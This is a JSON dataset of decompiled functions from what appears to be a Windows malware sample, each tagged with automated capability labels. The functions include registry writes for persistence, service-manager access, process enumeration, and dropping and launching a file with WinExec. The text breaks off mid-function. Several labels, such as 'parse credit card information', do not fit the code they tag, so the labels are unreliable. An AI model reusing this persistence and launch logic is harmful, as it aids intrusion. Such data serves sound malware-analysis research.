{
    "00401000": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401114) overlaps instruction at (ram,0x00401112)\n// \n\nuint fcn.00401000(uint param_1, uint param_2, uint param_3, uint param_4, uint32_t param_5, uint32_t param_6)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    uchar *puVar3;\n    char *pcVar4;\n    uchar uVar5;\n    uint8_t uVar6;\n    int32_t extraout_ECX;\n    int32_t iVar7;\n    uint32_t extraout_ECX_00;\n    uint16_t extraout_DX;\n    uint32_t uVar8;\n    char *unaff_EBX;\n    uint32_t uVar9;\n    uint *puVar10;\n    uint *puVar11;\n    bool bVar12;\n    bool bVar13;\n    uint32_t in_stack_ffffffa8;\n    uchar uStack40;\n    uint uStack39;\n    uint uStack8;\n    \n    // [00] -r-x section size 20480 named .text\n    uStack8 = fcn.00401520(param_5, param_6, 0x407054, 7);\n    if (uStack8 == NULL) {\n        return 0;\n    }\n    if ((uStack8 < 0) || (uStack8 >= 0)) {\n        iVar7 = 7;\n    }\n    else {\n        pcVar4 = uStack8 + 0x7b92f;\n        *pcVar4 = *pcVar4 + pcVar4;\n        iVar7 = extraout_ECX;\n    }\n    uStack40 = 0;\n    puVar10 = &uStack40 + 1;\n    for (; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    uVar9 = 0;\n    do {\n        uVar5 = (*_sym.imp.MSVCRT.dll_rand)();\n        (&uStack40)[uVar9] = uVar5;\n        uVar9 = uVar9 + 1;\n    } while (uVar9 < 0x20);\n    bVar12 = false;\n    bVar13 = unaff_EBX == 'O';\n    puVar10 = &uStack40;\n    puVar11 = uStack8;\n    for (iVar7 = 8; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar11 = *puVar10;\n        puVar10 = puVar10 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    uVar6 = fcn.00403840(param_1, param_2, param_3, param_4, &uStack40, 0x20, uStack8);\n    if ((bVar12 || bVar13) || (uVar9 = extraout_ECX_00,  uVar8 = extraout_DX,  !bVar12 && !bVar13)) {\n        uVar9 = param_6;\n        uVar8 = param_5;\n        in_stack_ffffffa8 = param_5;\n    }\n    cVar2 = *unaff_EBX;\n    puVar1 = puVar11 + -0x75;\n    puVar3 = *puVar1;\n    *puVar1 = *puVar1 - &stack0xffffffa8;\n    pcVar4 = (uVar9 & 0xffff0000 | CONCAT11((uVar9 >> 8) - cVar2, uVar9)) + 0x52;\n    *pcVar4 = (*pcVar4 - uVar8) - (uVar6 < 0x8b || uVar6 + 0x75 < (puVar3 < &stack0xffffffa8));\n    fcn.00403230(&uStack8 + 3, in_stack_ffffffa8);\n    return 1;\n}\n",
        "token_count": 907
    },
    "004019e0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401b18) overlaps instruction at (ram,0x00401b14)\n// \n\nuint * __cdecl fcn.004019e0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    bool bVar10;\n    \n    puVar9 = &stack0xfffffffc;\n    uVar2 = fcn.00404200(0, arg_8h, arg_ch + 1U >> 1);\n    puVar3 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    uVar8 = puVar3[0x16];\n    if (uVar2 < uVar8) {\n        iVar7 = (uVar2 - uVar8 & 0xffff) - 1;\n    }\n    else {\n        iVar7 = uVar2 - (uVar8 & 0xffff);\n    }\n    puVar6 = &stack0xfffffffc;\n    if ((iVar7 != 0) && (puVar6 = &stack0xfffffffc,  iVar7 == 0)) {\n        puVar5 = &stack0xffffffe8;\n        puVar6 = &stack0xffffffe8;\n        cVar1 = '\\x10';\n        do {\n            puVar9 = puVar9 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar9;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    uVar4 = uVar8 >> 0x10;\n    if (iVar7 < uVar8 >> 0x10) {\n        uVar8 = (iVar7 - uVar4 & 0xffff) - 1;\n    }\n    else {\n        uVar8 = iVar7 - uVar4;\n    }\n    bVar10 = CARRY4(uVar8, *(puVar6 + 0xc));\n    puVar9 = uVar8 + *(puVar6 + 0xc);\n    **(puVar6 + 0x14) = puVar9;\n    if ((bVar10 || puVar9 == NULL) || (!bVar10 && puVar9 != NULL)) {\n        uVar4 = puVar3[0x16];\n    }\n    else {\n        *puVar3 = *puVar9;\n        puVar6 = 0x8be181d0;\n        puVar3 = puVar3 + 3;\n    }\n    **(puVar6 + 0x10) = uVar4;\n    return puVar3;\n}\n",
        "token_count": 636
    },
    "00402cb0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402cb0(uint arg_8h)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint hObject;\n    \n    hObject = 0xffffffff;\n    iVar3 = (**0x41e890)(2, 0);\n    if (iVar3 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar5 = &var_128h;\n    for (iVar4 = 0x49; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = (**0x41e894)(iVar3, &var_12ch);\n    pcVar2 = _sym.imp.MSVCRT.dll__stricmp;\n    uVar1 = hObject;\n    while( true ) {\n        hObject = uVar1;\n        if (iVar4 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n            return uVar1;\n        }\n        iVar4 = (*pcVar2)(&var_108h, arg_8h);\n        if (iVar4 == 0) break;\n        iVar4 = (**0x41e898)(iVar3, &var_12ch);\n        uVar1 = hObject;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    return var_124h;\n}\n",
        "token_count": 371
    },
    "00403c20": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403c20(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    uint in_ECX;\n    uint8_t in_DL;\n    bool bVar2;\n    bool bVar3;\n    \n    bVar2 = false;\n    bVar3 = (in_ECX >> 8 | in_DL | 0x1f) == 0;\n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    if ((!bVar2 && !bVar3) && (bVar2 || bVar3)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uVar1 = fcn.00401490(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 209
    },
    "004012f0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401431) overlaps instruction at (ram,0x00401428)\n// \n\nuint __cdecl fcn.004012f0(code *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code cVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    code *pcVar7;\n    code *pcVar8;\n    bool bVar9;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    code *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar7 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar6 = &var_263h;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    var_160h = '\\0';\n    puVar6 = &var_15fh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x40708c, arg_8h);\n    (*pcVar7)(&var_264h, 0x4070a4, arg_8h);\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar5 = 0xffffffff;\n    pcVar3 = &var_160h;\n    do {\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar5 - 1;\n    bVar9 = false;\n    uVar5 = 0xffffffff;\n    pcVar7 = arg_8h;\n    do {\n        pcVar8 = pcVar7;\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        pcVar8 = pcVar7 + 1;\n        bVar9 = *pcVar7 != 0x0;\n        cVar2 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar2 != 0x0);\n    var_34h = 0x4070cc;\n    var_30h = 0x4070d8;\n    var_2ch = 0x4070e4;\n    var_28h = 0x4070f4;\n    var_24h = 0x4070fc;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar5 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((bVar9) || (!bVar9)) {\n        if (4 < (arg_ch != 0)) {\n            return 1;\n        }\n        arg_8h = (arg_ch != 0) * 4;\n        pcVar8 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    }\n    else {\n        *(arg_8h + 0x43d1773a) = *(arg_8h + 0x43d1773a) ^ 0x8327e95e;\n        pcVar3 = (!bVar9 + 0xba1a0680 & 0xffffff00 | !bVar9 + 0xba1a0680 + 0x9f) + 1;\n        *pcVar3 = *pcVar3 + pcVar3;\n    }\n    do {\n        iVar4 = (*pcVar8)(0x80000002, &var_264h, *(&var_34h + arg_8h), *(&var_5ch + arg_8h), *(&var_20h + arg_8h), \n                          *(&var_48h + arg_8h));\n        if (iVar4 != 0) {\n            return 0;\n        }\n        arg_8h = arg_8h + 4;\n    } while (arg_8h < 0x14);\n    return 1;\n}\n",
        "token_count": 1321
    },
    "004015b0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.004015b0(void)\n\n{\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 120
    },
    "004023c0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402655) overlaps instruction at (ram,0x00402652)\n// \n\nvoid fcn.004023c0(void)\n\n{\n    char cVar1;\n    uint in_EAX;\n    char extraout_CH;\n    uint8_t extraout_CH_00;\n    char extraout_CH_01;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    char *unaff_EBX;\n    int32_t unaff_EDI;\n    bool bVar2;\n    bool bVar3;\n    float10 fVar4;\n    ulong uVar5;\n    uint in_stack_ffffffd8;\n    uint in_stack_ffffffdc;\n    uint arg_14h;\n    \n    bVar2 = false;\n    bVar3 = ((unaff_EBX & 0xff00 | unaff_EBX | in_EAX >> 8) & 0x94f) == 0;\n    arg_14h = 0x4023ec;\n    fcn.00402de0(0x41e874, 8, 0x407010, 0x11);\n    if ((bVar2 || bVar3) || (!bVar2 && !bVar3)) {\n        arg_14h = 0xf;\n        in_stack_ffffffdc = 0x40722c;\n        in_stack_ffffffd8 = 8;\n    }\n    cVar1 = *unaff_EBX;\n    *(unaff_EDI + 0x6a) = *(unaff_EDI + 0x6a) - &stack0xffffffd8;\n    *(extraout_EDX + 8) = *(extraout_EDX + 8) + (extraout_CH - cVar1);\n    fcn.00402de0(0x41e874, in_stack_ffffffd8, in_stack_ffffffdc, arg_14h);\n    uVar5 = fcn.00402de0(0x41e874, 8, 0x40723c, 0x1a);\n    bVar2 = ((uVar5 >> 0x20 & 0xffffff00 | extraout_CH_00) & uVar5) < 0;\n    fVar4 = fcn.00402de0(0x41e874, 8, 0x407290, 10);\n    if ((!bVar2) && (bVar2)) {\n        *(unaff_EDI + 0x1c) = fVar4;\n    }\n    fcn.00402de0(0x41e874, 8, 0x40729c, 0xb);\n    fcn.00402de0(0x41e874, 8, 0x4072a8, 8);\n    fcn.00402de0(0x41e874, 8, 0x4072b0, 9);\n    fcn.00402de0(0x41e874, 8, 0x4072bc, 9);\n    fcn.00402de0(0x41e874, 8, 0x4072c8, 9);\n    fcn.00402de0(0x41e874, 8, 0x4072d4, 0xc);\n    fcn.00402de0(0x41e874, 8, 0x4072e0, 3);\n    fcn.00402de0(0x41e874, 8, 0x4072e4, 10);\n    fcn.00402de0(0x41e874, 8, 0x4072f0, 0x40);\n    fcn.00402de0(0x41e874, 8, 0x407330, 0xc);\n    fcn.00402de0(0x41e874, 8, 0x40733c, 0xb);\n    fcn.00402de0(0x41e874, 8, 0x407348, 4);\n    bVar2 = false;\n    fcn.00402de0(0x41e874, 8, 0x40734c, 4);\n    if ((bVar2) || (!bVar2)) {\n        *(extraout_EDX_00 + 8) = *(extraout_EDX_00 + 8) + extraout_CH_01;\n        fcn.00402de0(0x41e874, 8, 0x407350, 0xc);\n        fcn.00402de0(0x41e874, 8, 0x40735c, 4);\n    }\n    fcn.00402de0(0x41e874, 8, 0x407360, 9);\n    fcn.00402de0(0x41e874, 8, 0x40736c, 0x16);\n    fcn.00402de0(0x41e874, 8, 0x407384, 7);\n    return;\n}\n",
        "token_count": 1127
    },
    "004037f0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.004037f0(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00403e20(0x80000002, 0x4071d8, 0x407224, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 134
    },
    "004043d0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404463) overlaps instruction at (ram,0x0040445f)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.004043d0(uint32_t s1)\n\n{\n    int32_t iVar1;\n    uint8_t extraout_DH;\n    uint *puVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(s1);\n    var_14h = 0x407440;\n    var_10h = 0x407438;\n    var_ch = 0x407448;\n    var_8h = 0x407450;\n    var_4h = 0x407458;\n    puVar3 = NULL;\n    puVar2 = &var_14h;\n    do {\n        uVar4 = *puVar2;\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(s1, uVar4);\n        if (iVar1 != 0) {\n            return true;\n        }\n        puVar3 = puVar3 + 1;\n        puVar2 = puVar2 + 1;\n    } while (puVar3 < 0x5);\n    if ((puVar3 < 0x6) || (0x5 < puVar3)) {\n        uVar4 = 0x407430;\n    }\n    else {\n        *puVar3 = *puVar2;\n        s1 = s1 & 0xffff0000 | CONCAT11(0xdf, s1);\n        *(&stack0xffffffdc * 3) = *(&stack0xffffffdc * 3) ^ extraout_DH;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(s1, uVar4);\n    return iVar1 == 0;\n}\n",
        "token_count": 447
    },
    "004017f0": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401992) overlaps instruction at (ram,0x0040198d)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint64_t __cdecl fcn.004017f0(int16_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t *extraout_ECX;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint32_t in_EDX;\n    uint extraout_EDX;\n    int32_t unaff_EBX;\n    uint *puVar8;\n    uint *puVar9;\n    uint unaff_EBP;\n    int32_t *piVar10;\n    int32_t *piVar11;\n    int32_t *piVar12;\n    int16_t **unaff_EDI;\n    uint16_t in_SS;\n    bool bVar13;\n    bool bVar14;\n    uint64_t uVar15;\n    int32_t *piStack36;\n    int32_t *piStack28;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puVar8 = &stack0xfffffffc;\n    bVar13 = &stack0xfffffffc < 0x8;\n    if ((!bVar13) && (bVar13)) {\n        unaff_EBX = unaff_EBX + *(unaff_EBX + 0x69 + in_EDX * 4) + bVar13;\n    }\n    if (*arg_8h != 0x5a4d) {\n        return in_EDX << 0x20;\n    }\n    bVar13 = SCARRY4(*(arg_8h + 0x1e), arg_8h);\n    piVar10 = *(arg_8h + 0x1e) + arg_8h;\n    if ((!bVar13) && (bVar13)) {\n        *unaff_EDI = arg_8h;\n        return CONCAT44(unaff_EBP, arg_8h);\n    }\n    if (*piVar10 != 0x4550) {\n        return in_EDX << 0x20;\n    }\n    if (piVar10[0x16] != 0) {\n        return in_EDX << 0x20;\n    }\n    var_4h = 0x40;\n    if (*(arg_8h + 0x1e) < 0x81) {\n        return in_EDX << 0x20;\n    }\n    if (*(arg_8h + 0x1e) < 0xc0) {\n        var_4h = *(arg_8h + 0x1e) - 0x80;\n    }\n    piStack28 = var_4h;\n    uVar15 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n    pcVar3 = _sym.imp.MSVCRT.dll_rand;\n    piVar12 = uVar15;\n    bVar13 = piVar12 == NULL;\n    if (bVar13) {\n        return uVar15 & 0xffffffff00000000;\n    }\n    piVar6 = extraout_ECX;\n    if (!bVar13) {\n        piStack28 = extraout_ECX << 0x10;\n        piVar6 = (extraout_ECX >> 8 & 0xffff00) << 8 | extraout_ECX & 0xffff;\n        if (bVar13) goto code_r0x00401946;\n    }\n    piVar10 = NULL;\ncode_r0x00401946:\n    piStack28 = piStack28 & 0xffff0000 | in_SS;\n    bVar14 = false;\n    bVar13 = piStack28 == NULL;\n    piVar11 = piVar10;\n    piVar1 = piStack28;\n    if (!bVar13) {\n        do {\n            iVar4 = (*pcVar3)();\n            piVar6 = 0xff;\n            piVar11 = piVar10 + 1;\n            *(piVar10 + piVar12) = iVar4 % 0xff;\n            bVar14 = SBORROW4(piVar11, var_4h);\n            piVar1 = piVar11 - var_4h;\n            bVar13 = piVar11 == var_4h;\n            piVar10 = piVar11;\n            piStack28 = var_4h;\n        } while (piVar11 < var_4h);\n    }\n    if ((bVar13 || bVar14 != piVar1 < 0) || (!bVar13 && bVar14 == piVar1 < 0)) {\n        piVar10 = arg_8h + 0x40;\n        piVar6 = piStack28;\n    }\n    else {\n        *(piVar12 + -0x74c625aa) = *(piVar12 + -0x74c625aa) ^ piVar6;\n        *(unaff_EBX + -0x720f7430) = *(unaff_EBX + -0x720f7430) | piVar6;\n        piVar12 = piVar11;\n        piVar10 = piStack28;\n    }\n    for (uVar7 = piVar6 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *piVar10 = *piVar12;\n        piVar12 = piVar12 + 1;\n        piVar10 = piVar10 + 1;\n    }\n    uVar7 = piVar6 & 3;\n    bVar13 = (POPCOUNT(uVar7) & 1U) != 0;\n    for (; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *piVar10 = *piVar12;\n        piVar12 = piVar12 + 1;\n        piVar10 = piVar10 + 1;\n    }\n    if ((bVar13) && (!bVar13)) {\n        puVar9 = &stack0xffffffe0;\n        cVar2 = '\\x1e';\n        do {\n            puVar8 = puVar8 + -1;\n            puVar9 = puVar9 + -1;\n            *puVar9 = *puVar8;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n        uVar5 = in(0x78);\n        return CONCAT44(piVar6, uVar5);\n    }\n    func_0x00404fb0();\n    return CONCAT44(extraout_EDX, 1);\n}\n",
        "token_count": 1458
    },
    "00402a00": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00402a00(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x41e8bc == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00402e60(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4072e4, acStack1304, &uStack2112);\n    uStack2088 = 0x40736c;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x407384;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00401130(auStack1564, 0x4072e0, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1870
    },
    "00403c70": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403d13)\n\nuint __cdecl fcn.00403c70(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint *puVar8;\n    char lpBuffer;\n    uint var_22bh;\n    uint var_128h;\n    uint var_24h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    \n    lpBuffer = '\\0';\n    var_128h._0_1_ = 0;\n    puVar5 = &var_22bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    puVar5 = &var_128h + 1;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    uVar3 = 0xffffffff;\n    pcVar6 = &lpBuffer;\n    do {\n        pcVar7 = pcVar6;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar7 = pcVar6 + 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar7 + -uVar3;\n    puVar8 = &var_128h;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar6 = 0x407048;\n    do {\n        pcVar7 = pcVar6;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 